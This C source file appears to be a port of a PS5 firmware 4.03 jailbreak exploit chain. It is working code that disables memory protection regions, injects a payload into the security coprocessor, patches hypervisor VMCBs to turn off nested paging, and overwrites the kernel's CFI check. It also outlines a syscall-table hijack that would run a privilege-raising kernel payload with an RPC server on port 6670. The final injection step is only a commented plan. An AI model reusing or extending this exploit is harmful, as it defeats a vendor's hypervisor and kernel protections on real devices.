/*
 * Prosperous exploit orchestrator for PS5 FW 4.03.
 *
 * This is the main entry point that chains together all exploit stages:
 *
 *   Stage 1: TMR Bypass
 *     - Disable TMR 20 (MP4 carveout) for x86 write access to MP4 DRAM
 *     - Create TMR 21 covering kernel text region with all-access
 *     - Disable TMR 5/17/18 (HV region protections)
 *
 *   Stage 2: MP4 Payload Injection
 *     - Write AArch64 EL3 thunk to MP4 DRAM at 0x600E0000
 *     - Write main payload to 0x607F1000
 *     - Hook mDbg_intr → thunk → payload
 *     - Enable QAF flag to activate
 *
 *   Stage 3: VMCB Patching
 *     - Setup SysHub TLB entries to map HV memory via MP4
 *     - Read vCPU contexts and VMCB pointers
 *     - Disable nested paging (NP_ENABLE=0) on all VMCBs
 *     - Clear most intercepts (keep VMSAVE/VMLOAD/VMMCALL/VMRUN)
 *
 *   Stage 4: TMR Restore
 *     - Re-enable TMR 20 (prevents kernel panic on game restart)
 *     - Restore HV TMR protections (5/17/18)
 *
 *   Stage 5: CFI Bypass + Kernel Payload
 *     - NOP the cfi_check_fail function via MP4 write
 *     - Inject kpayload via syscall table hijack
 *     - kpayload disables NDA on all cores, elevates privileges
 *     - Starts TCP RPC server on port 6670
 *
 * Prerequisites:
 *   - Kernel R/W via kekcall (ps5-kstuff or equivalent loaded)
 *   - Physical memory access via DMAP
 *   - Network connectivity to PS5
 *
 * Build: Part of the prosperous_port PS5 payload SDK build.
 * Deploy: Via PS5_DEPLOY to console running on FW 4.03.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/*
 * Discover the DMAP base address by reading the current process's pmap.
 *
 * The DMAP base is computed as: pm_pml4 (kernel VA) - pm_cr3 (PA)
 * This gives the kernel's direct-map base for physical memory.
 */
static int discover_dmap_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t vmspace;
    uint64_t pm_pml4;
    uint64_t pm_cr3;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0) {
        printf("[!] Failed to get proc address\n");
        return -1;
    }

    /* proc -> p_vmspace */
    kernel_copyout(proc_addr + OFF_PROC_P_VMSPACE, &vmspace, sizeof(vmspace));

    /* vmspace -> vm_pmap -> pm_pml4 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_PML4,
                   &pm_pml4, sizeof(pm_pml4));

    /* vmspace -> vm_pmap -> pm_cr3 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_CR3,
                   &pm_cr3, sizeof(pm_cr3));

    ctx->dmap_base = pm_pml4 - pm_cr3;
    ctx->proc_cr3 = pm_cr3;
    printf("[*] DMAP base: 0x%lx\n", ctx->dmap_base);
    printf("[*] Process CR3: 0x%lx\n", ctx->proc_cr3);

    return 0;
}

/*
 * Discover the kernel text base address.
 *
 * We scan kernel data for the kernel pmap structure by looking for
 * characteristic field values, or use the LSTAR MSR approach.
 */
static int discover_kernel_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t sysvec;
    uint64_t sysent;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0)
        return -1;

    /* Read kernel text base from the process's sysvec.
     * proc -> p_sysent -> sysvec points to the system call vector,
     * which is in kernel .data and gives us a reference address. */
    kernel_copyout(proc_addr + OFF_PROC_P_SYSENT, &sysvec, sizeof(sysvec));
    kernel_copyout(sysvec + OFF_SYSVEC_SYSENT, &sysent, sizeof(sysent));

    /* The sysent table is at a known offset from kernel base.
     * We can also read ktext_start_va from the TMR 16 base. */

    /* Alternative: use TMR 16 base to get kernel text PA,
     * then read the VA from a known offset */
    uint32_t tmr16_base;
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;
    uint32_t tmr16_addr = 16 * 0x10;

    kernel_copyin(&tmr16_addr, ind_index_kva, sizeof(tmr16_addr));
    kernel_copyout(ind_data_kva, &tmr16_base, sizeof(tmr16_base));

    ctx->ktext_base_pa = (uint64_t)tmr16_base << 16;

    printf("[*] Kernel text PA: 0x%lx\n", ctx->ktext_base_pa);

    /* Derive kernel text VA from DMAP: any kernel VA = DMAP + PA works
     * for accessing kernel data via kernel_copyout. We use DMAP+PA
     * for all accesses since KOFF_KTEXT_VA_PTR is FW-specific and
     * unreliable across firmware versions. */
    ctx->ktext_base = ctx->dmap_base + ctx->ktext_base_pa;
    printf("[*] Kernel text (DMAP): 0x%lx\n", ctx->ktext_base);

    /* Get kernel PML4 PA */
    uint64_t kpmap_addr = ctx->ktext_base + KOFF_KERNEL_PMAP;
    uint64_t kpmap;
    kernel_copyout(kpmap_addr, &kpmap, sizeof(kpmap));
    kernel_copyout(kpmap + OFF_PMAP_PM_CR3, &ctx->kpml4_pa, sizeof(ctx->kpml4_pa));

    printf("[*] Kernel PML4 PA: 0x%lx\n", ctx->kpml4_pa);

    return 0;
}

/*
 * NOP the cfi_check_fail function via MP4 memory write.
 *
 * This is necessary because the kernel uses Control Flow Integrity (CFI)
 * checks that would trap our syscall table hijack. By NOPing the check
 * function, we prevent CFI from blocking our payload execution.
 *
 * We use the MP4 coprocessor to write to kernel text because it has
 * its own DMA path that bypasses x86 page table NX/RO protections.
 */
static int cfi_bypass(struct phys_rw_ctx *ctx)
{
    uint64_t cfi_check_fail_pa = ctx->ktext_base_pa + KOFF_CFI_CHECK_FAIL;
    uint32_t nop_sled = 0xC3C3C3C3; /* ret; ret; ret; ret */

    /* Setup SysHub TLB to map the kernel text region */
    if (mp4_syshub_tlb_setup(ctx, 32, cfi_check_fail_pa) != 0) {
        printf("[!] Failed to setup SysHub TLB for CFI bypass\n");
        return -1;
    }

    /* Write NOP/RET over cfi_check_fail via MP4 */
    uint32_t mp4_va = 0x80000000 + (cfi_check_fail_pa & 0x03FFFFFF);
    mp4_write32(ctx, mp4_va, nop_sled);

    printf("[*] CFI check_fail patched at PA 0x%lx\n", cfi_check_fail_pa);
    return 0;
}

/*
 * Main exploit entry point.
 */
int prosperous_run(void)
{
    struct phys_rw_ctx ctx;
    int ret;

    /* Disable stdout buffering so all diagnostics are visible */
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("========================================\n");
    printf(" prosperous_port - PS5 HV Bypass\n");
    printf(" FW 4.03 (CEX)\n");
    printf(" Ported from fail0verflow/prosperous\n");
    printf("========================================\n\n");

    /* Phase 0: Discover memory layout */
    printf("[*] Phase 0: Discovering memory layout...\n");

    ret = discover_dmap_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover DMAP base\n");
        return ret;
    }

    ret = discover_kernel_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover kernel base\n");
        return ret;
    }

    /* Phase 1: TMR bypass */
    printf("\n[*] Phase 1: TMR bypass...\n");

    ret = tmr_bypass_init(&ctx);
    if (ret != 0) {
        printf("[!] TMR bypass init failed: %d\n", ret);
        return ret;
    }
    printf("[+] TMR 20 disabled, TMR 21 created\n");

    /* Phase 1.5: Ensure DMAP mapping for MP4 DRAM (PA 0x60000000) */
    printf("\n[*] Phase 1.5: Creating DMAP mapping for MP4 DRAM...\n");
    {
        uint64_t dmap = ctx.dmap_base;
        uint64_t target_va = dmap + MP4_DRAM_BASE;
        uint32_t pml4_idx = (target_va >> 39) & 0x1FF;
        uint32_t pdpt_idx = (target_va >> 30) & 0x1FF;
        uint32_t pd_idx   = (target_va >> 21) & 0x1FF;

        printf("[*] DMAP VA for DRAM: 0x%lx\n", target_va);
        printf("[*] Indices: PML4[0x%x] PDPT[0x%x] PD[0x%x]\n",
               pml4_idx, pdpt_idx, pd_idx);

        /* Use process CR3 (correct!) instead of kpml4_pa (wrong offset) */
        uint64_t cr3 = ctx.proc_cr3;
        printf("[*] Using process CR3: 0x%lx (kpml4_pa was 0x%lx)\n",
               cr3, ctx.kpml4_pa);

        /* Walk PML4 */
        uint64_t pml4e;
        kernel_copyout(dmap + cr3 + pml4_idx * 8, &pml4e, 8);
        printf("[DIAG] PML4[0x%x] = 0x%016lx %s\n", pml4_idx, pml4e,
               (pml4e & 1) ? "PRESENT" : "NOT PRESENT");

        if (!(pml4e & 1)) {
            printf("[!] PML4 not present - cannot create DRAM mapping\n");
            goto phase2;
        }

        uint64_t pdpt_pa = pml4e & 0xFFFFFFFFFF000ULL;

        /* Walk PDPT */
        uint64_t pdpte;
        kernel_copyout(dmap + pdpt_pa + pdpt_idx * 8, &pdpte, 8);
        printf("[DIAG] PDPT[0x%x] = 0x%016lx %s%s\n", pdpt_idx, pdpte,
               (pdpte & 1) ? "PRESENT" : "NOT PRESENT",
               (pdpte & (1 << 7)) ? " 1GB-PAGE" : "");

        if (!(pdpte & 1)) {
            /* PDPT entry missing - need to allocate a PD page and create it.
             * Use mmap to get a physical page, then use it as our PD. */
            printf("[*] Allocating PD page for DRAM mapping...\n");

            /* mmap a 4KB page to use as PD */
            void *pd_user = (void *)__builtin_frame_address(0);
            {
                /* Use syscall directly since we might not have mmap linked */
                pd_user = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                               MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
            }
            if (pd_user == MAP_FAILED) {
                printf("[!] mmap failed for PD page\n");
                goto phase2;
            }

            /* Zero the page and touch it to ensure PTE exists */
            memset(pd_user, 0, 0x1000);

            /* Walk process page tables to find PA of our PD page */
            uint64_t pd_phys = 0;
            {
                uint64_t va = (uint64_t)pd_user;
                uint64_t l4_idx = (va >> 39) & 0x1FF;
                uint64_t l3_idx = (va >> 30) & 0x1FF;
                uint64_t l2_idx = (va >> 21) & 0x1FF;
                uint64_t l1_idx = (va >> 12) & 0x1FF;
                uint64_t entry;

                /* PML4 */
                kernel_copyout(dmap + cr3 + l4_idx * 8, &entry, 8);
                if (!(entry & 1)) { printf("[!] PD user PML4 NP\n"); goto phase2; }
                uint64_t l3_pa = entry & 0xFFFFFFFFFF000ULL;

                /* PDPT */
                kernel_copyout(dmap + l3_pa + l3_idx * 8, &entry, 8);
                if (!(entry & 1)) { printf("[!] PD user PDPT NP\n"); goto phase2; }
                if (entry & (1 << 7)) {
                    pd_phys = (entry & 0xFFFFFFC0000000ULL) | (va & 0x3FFFFFFF);
                } else {
                    uint64_t l2_pa = entry & 0xFFFFFFFFFF000ULL;

                    /* PD */
                    kernel_copyout(dmap + l2_pa + l2_idx * 8, &entry, 8);
                    if (!(entry & 1)) { printf("[!] PD user PD NP\n"); goto phase2; }
                    if (entry & (1 << 7)) {
                        pd_phys = (entry & 0xFFFFFFFE00000ULL) | (va & 0x1FFFFF);
                    } else {
                        uint64_t l1_pa = entry & 0xFFFFFFFFFF000ULL;

                        /* PT */
                        kernel_copyout(dmap + l1_pa + l1_idx * 8, &entry, 8);
                        if (!(entry & 1)) { printf("[!] PD user PT NP\n"); goto phase2; }
                        pd_phys = (entry & 0xFFFFFFFFFF000ULL) | (va & 0xFFF);
                    }
                }
            }

            /* pd_phys is the page-aligned PA of our mmap'd page */
            pd_phys &= ~0xFFFULL;
            printf("[*] PD page PA: 0x%lx\n", pd_phys);

            /* Fill the PD page with 2MB entries covering the DRAM range.
             * We write to it via DMAP (our page IS in real RAM, so DMAP works). */
            for (uint32_t i = 0; i < 512; i++) {
                /* Compute what PA this PD entry should map.
                 * The PDPT[0xF5] covers a 1GB range. For DMAP, the 1GB PA is:
                 * pdpt_idx * 1GB minus whatever the DMAP mapping covers.
                 * Actually, for DMAP linear mapping: the 1GB range covered by
                 * PDPT[F5] is simply the 1GB aligned to the PA space.
                 *
                 * For VA = DMAP + 0x60000000:
                 *   PDPT[0xF5] covers VA range [DMAP+F5*1GB, DMAP+(F5+1)*1GB)
                 *   But F5*1GB = 0x3D40000000 which doesn't equal 0x60000000.
                 *   This means the DMAP uses PML4 to offset.
                 *
                 * The PA mapped by PDPT[pdpt_idx] PD[i] in DMAP context:
                 *   PA = ((PML4_offset * 512 + pdpt_idx) * 512 + i) * 2MB
                 *   where PML4_offset is (target_va >> 39) relative to DMAP
                 *
                 * Simplification: the PDPT[0xF5] should map PAs in the range
                 * that includes 0x60000000. Since we know pd_idx=0x100 maps
                 * PA 0x60000000, the formula is:
                 *   PA = (PD_entry_index - pd_idx_for_0x60000000) * 2MB + 0x60000000
                 * But that only works for the entries near pd_idx.
                 *
                 * General: PA = (pdpt_base_pa) + i * 2MB
                 * where pdpt_base_pa is the start of the 1GB range.
                 *
                 * From target_va = DMAP + 0x60000000:
                 *   The 1GB aligned base of 0x60000000 is 0x40000000
                 *   (since 0x40000000 = 1GB, 0x80000000 = 2GB)
                 *   So pdpt_base_pa = 0x40000000
                 * Then PD[i] maps PA = 0x40000000 + i * 0x200000
                 * And PD[0x100] maps PA = 0x40000000 + 0x100*0x200000 = 0x60000000 ✓
                 */
                uint64_t entry_pa = 0x40000000ULL + (uint64_t)i * 0x200000ULL;
                uint64_t pde;

                /* Only create entries for the DRAM range with UC.
                 * For all other entries, create normal WB entries so
                 * other memory in this 1GB range still works. */
                if (entry_pa >= MP4_DRAM_BASE &&
                    entry_pa < (MP4_DRAM_BASE + 0x800000)) {
                    /* DRAM region: UC (PCD=1) */
                    pde = entry_pa |
                          (1ULL << 0) |  /* Present */
                          (1ULL << 1) |  /* RW */
                          (1ULL << 4) |  /* PCD */
                          (1ULL << 5) |  /* Accessed */
                          (1ULL << 6) |  /* Dirty */
                          (1ULL << 7);   /* PS (2MB) */
                } else {
                    /* Normal memory: WB (same as typical DMAP) */
                    pde = entry_pa |
                          (1ULL << 0) |  /* Present */
                          (1ULL << 1) |  /* RW */
                          (1ULL << 5) |  /* Accessed */
                          (1ULL << 6) |  /* Dirty */
                          (1ULL << 7);   /* PS (2MB) */
                }

                kernel_copyin(&pde, dmap + pd_phys + i * 8, 8);
            }

            printf("[+] Filled PD page with 512 x 2MB entries\n");
            printf("[+] DRAM entries (PD[0x%x]-PD[0x%x]) have PCD set\n",
                   pd_idx, pd_idx + 3);

            /* Create PDPT entry pointing to our PD page */
            uint64_t new_pdpte = pd_phys |
                                 (1ULL << 0) |  /* Present */
                                 (1ULL << 1) |  /* RW */
                                 (1ULL << 5);   /* Accessed */
            kernel_copyin(&new_pdpte, dmap + pdpt_pa + pdpt_idx * 8, 8);
            printf("[+] Created PDPT[0x%x] = 0x%016lx -> PD at PA 0x%lx\n",
                   pdpt_idx, new_pdpte, pd_phys);

            /* Verify DRAM access works now */
            uint32_t test_val = 0xDEADDEAD;
            int32_t rc = kernel_copyout(dmap + MP4_DRAM_BASE,
                                        &test_val, sizeof(test_val));
            printf("[DIAG] DRAM[0] after mapping: 0x%08x (rc=%d)\n",
                   test_val, rc);

            if (rc == 0 && test_val != 0xDEADDEAD) {
                printf("[+] DRAM access working!\n");
            } else {
                printf("[!] DRAM access still failing\n");
            }
        } else if ((pdpte & 1) && (pdpte & (1 << 7))) {
            /* 1GB page - set PCD */
            printf("[*] DRAM mapped via 1GB page, setting PCD...\n");
            uint64_t new_pdpte = pdpte | (1ULL << 4);
            kernel_copyin(&new_pdpte, dmap + pdpt_pa + pdpt_idx * 8, 8);

            uint32_t test_val = 0xDEADDEAD;
            int32_t rc = kernel_copyout(dmap + MP4_DRAM_BASE,
                                        &test_val, sizeof(test_val));
            printf("[DIAG] DRAM[0] after PCD: 0x%08x (rc=%d)\n",
                   test_val, rc);
        } else {
            /* PDPT present, not 1GB page - check PD entries and fix only
             * the single entry we need (PD[pd_idx] covering MP4_DRAM_BASE).
             * Minimise page table modifications to avoid kernel panics from
             * speculative accesses or TLB coherency issues on other cores. */
            uint64_t pd_pa = pdpte & 0xFFFFFFFFFF000ULL;
            printf("[*] PDPT -> PD at PA 0x%lx\n", pd_pa);

            /* Dump a few entries for diagnostics */
            for (int i = 0; i < 5; i++) {
                uint64_t pde;
                kernel_copyout(dmap + pd_pa + (pd_idx + i) * 8, &pde, 8);
                printf("[DIAG] PD[0x%x] = 0x%016lx %s\n",
                       pd_idx + i, pde, (pde & 1) ? "P" : "NP");
            }

            /* Only create PD[pd_idx] (covers PA 0x60000000-0x601FFFFF)
             * which has the thunk (0x600E0000), hook (0x60108BD4), and
             * QAF flags (0x60123B74). Payload at 0x607F1000 is already
             * in PD[0x103] which exists. */
            uint64_t pde;
            kernel_copyout(dmap + pd_pa + pd_idx * 8, &pde, 8);

            if (!(pde & 1)) {
                uint64_t target_pa = 0x40000000ULL + (uint64_t)pd_idx * 0x200000ULL;

                /* Match flags exactly to working PD[0x103]=0x80000000606001e3:
                 * NX(63) | G(8) | PS(7) | D(6) | A(5) | RW(1) | P(0)
                 * NO PCD — use WB caching like existing entries.
                 * Previous attempts with PCD panicked instantly. */
                uint64_t new_pde = target_pa |
                                   (1ULL << 0) |   /* Present */
                                   (1ULL << 1) |   /* RW */
                                   (1ULL << 5) |   /* Accessed */
                                   (1ULL << 6) |   /* Dirty */
                                   (1ULL << 7) |   /* PS (2MB) */
                                   (1ULL << 8) |   /* Global */
                                   (1ULL << 63);   /* NX */
                kernel_copyin(&new_pde, dmap + pd_pa + pd_idx * 8, 8);
                printf("[+] Created PD[0x%x] = 0x%016lx (2MB WB, PA 0x%lx)\n",
                       pd_idx, new_pde, target_pa);

                /* Do NOT verify by reading DRAM here — previous attempts
                 * panicked on the verification read. The nested page tables
                 * (HV active) might not map guest PA 0x60000000.
                 * Instead, skip to Phase 2 which will attempt DRAM writes.
                 * If those also panic, we need a DMA-based approach. */
                printf("[*] Skipping DRAM verification (panic avoidance)\n");
                printf("[*] Will test access in Phase 2...\n");
            } else {
                printf("[*] PD[0x%x] already present: 0x%016lx\n", pd_idx, pde);
            }
        }
    }

phase2:

    /* Phase 2: MP4 payload injection */
    printf("\n[*] Phase 2: MP4 payload injection...\n");

    ret = mp4_inject_payload(&ctx);
    if (ret != 0) {
        printf("[!] MP4 payload injection failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload injected and activated\n");

    /* Re-enable TMR 20 after injection (matches original prosperous flow).
     * The A53 accesses its own DRAM through its IOMMU, not through x86 TMR.
     * Leaving TMR 20 disabled causes kernel panics on game restart. */
    tmr_restore_tmr20(&ctx);
    printf("[+] TMR 20 restored\n");

    /* Give the A53 time to process the QAF flag and activate the payload.
     * The payload hooks mDbg_intr via SError handler - the A53 needs to
     * take an interrupt cycle to activate the hook. */
    printf("[*] Waiting for MP4 payload activation...\n");
    usleep(500000); /* 500ms */

    /* Diagnostic: read c2p reg 0 to see if a previous command is stuck */
    {
        uint32_t c2p0_val;
        uint64_t bar2_kva = ctx.dmap_base + MP4_BAR2_PA;
        kernel_copyout(bar2_kva + MP4_C2P_REG(0, 0), &c2p0_val, sizeof(c2p0_val));
        printf("[DIAG] c2p reg 0 before ping: 0x%08x\n", c2p0_val);

        /* Also read p2c reg 0 to check if A53 has sent anything */
        uint32_t p2c0_val;
        kernel_copyout(bar2_kva + MP4_P2C_REG0(0), &p2c0_val, sizeof(p2c0_val));
        printf("[DIAG] p2c reg 0: 0x%08x\n", p2c0_val);
    }

    /* Verify MP4 payload is alive (retry a few times) */
    for (int attempt = 0; attempt < 5; attempt++) {
        ret = mp4_ping(&ctx);
        if (ret == 0)
            break;
        printf("[*] MP4 ping attempt %d failed, retrying...\n", attempt + 1);
        usleep(500000);
    }
    if (ret != 0) {
        printf("[!] MP4 payload not responding after retries\n");
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload ping OK\n");

    /* Phase 3: Disable HV TMR protections */
    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");

    ret = tmr_disable_hv_regions(&ctx);
    if (ret != 0) {
        printf("[!] HV TMR disable failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] HV TMR protections disabled\n");

    /* Phase 4: VMCB patching */
    printf("\n[*] Phase 4: VMCB patching (disabling nested paging)...\n");

    ret = vmcb_patch_disable_np(&ctx);
    if (ret != 0) {
        printf("[!] VMCB patching failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] Nested paging disabled on all VMCBs\n");

    /* Phase 5: CFI bypass */
    printf("\n[*] Phase 5: CFI bypass...\n");

    ret = cfi_bypass(&ctx);
    if (ret != 0) {
        printf("[!] CFI bypass failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] CFI check_fail patched\n");

    /* Phase 6: Restore TMR protections */
    printf("\n[*] Phase 6: Restoring TMR protections...\n");
    tmr_restore_hv_regions(&ctx);
    printf("[+] TMR protections restored\n");

    /* Phase 7: Kernel payload injection */
    printf("\n[*] Phase 7: Kernel payload injection...\n");
    printf("[*] kpayload will be injected via syscall table hijack.\n");
    printf("[*] After injection, connect to port 6670 for RPC access.\n");

    ret = kpayload_inject(&ctx);
    if (ret != 0) {
        printf("[!] kpayload injection failed: %d\n", ret);
        return ret;
    }

    printf("\n========================================\n");
    printf(" [+] Exploit complete!\n");
    printf(" [+] RPC server listening on port 6670\n");
    printf(" [+] Connect with: python3 client.py\n");
    printf("========================================\n");

    return 0;
}

/*
 * Kernel payload injection via syscall table hijack.
 *
 * This follows the same approach as prosperous:
 *   1. Allocate userspace buffer for kpayload binary
 *   2. Map it with a 1GB page at 0xFFFFFFC0_00000000 for kernel access
 *   3. Temporarily replace syscall 8's handler with our payload
 *   4. Invoke syscall 8 to execute the payload in kernel context
 *   5. Restore the original syscall handler
 *
 * The kpayload binary must be loaded from disk or embedded.
 */
int kpayload_inject(struct phys_rw_ctx *ctx)
{
    printf("[*] kpayload injection placeholder\n");
    printf("[*] To complete: load kpayload binary and inject via sysent hijack\n");
    printf("[*] See pwn_mp4.lua from prosperous for the full injection flow\n");

    /*
     * TODO: Full implementation would:
     *
     * 1. Load kpayload binary from /mnt/usb0/kpayload or embed it
     *
     * 2. mmap a buffer and copy kpayload into it:
     *    void *payload_buf = mmap(NULL, size, PROT_READ|PROT_WRITE,
     *                             MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
     *    memcpy(payload_buf, kpayload_data, kpayload_size);
     *
     * 3. Get physical address of payload buffer:
     *    uint64_t payload_pa = vtophys(payload_buf);
     *
     * 4. Create a 1GB kernel mapping:
     *    uint64_t payload_kva = 0xFFFFFFC000000000 | (payload_pa & 0x3FFFFFFF);
     *    // Write PDPE at kpml4[0xFF8] + 0x800
     *    uint64_t pdp_pa = (read_phys64(kpml4_pa + 0xFF8) >> 12) << 12;
     *    write_phys64(pdp_pa + 0x800,
     *                 ((payload_pa >> 30) << 30) | 0x83);  // 1GB page, RWX
     *
     * 5. Read current sysent[8] and replace:
     *    // proc -> sysvec -> sysent
     *    uint64_t sysent_8_pa = get_pa(sysent_va + 0x30 * 8);
     *    uint64_t orig_call = read_phys64(sysent_8_pa + 8);
     *    write_phys32(sysent_8_pa, 8);  // narg = 8
     *    write_phys64(sysent_8_pa + 8, payload_kva);
     *
     * 6. Invoke syscall 8 multiple times (progressive init):
     *    syscall(8, ktext_base, payload_buf, host_addr, 0);  // op=0: version check
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 1);  // op=1: reloc
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 2);  // op=2: nda disable
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 3);  // op=3: full init
     *
     * 7. Restore sysent[8]:
     *    write_phys32(sysent_8_pa, 0);
     *    write_phys64(sysent_8_pa + 8, orig_call);
     *
     * 8. Clean up kernel mapping:
     *    write_phys64(pdp_pa + 0x800, 0);
     */

    return 0;
}

int main(void)
{
    return prosperous_run();
}
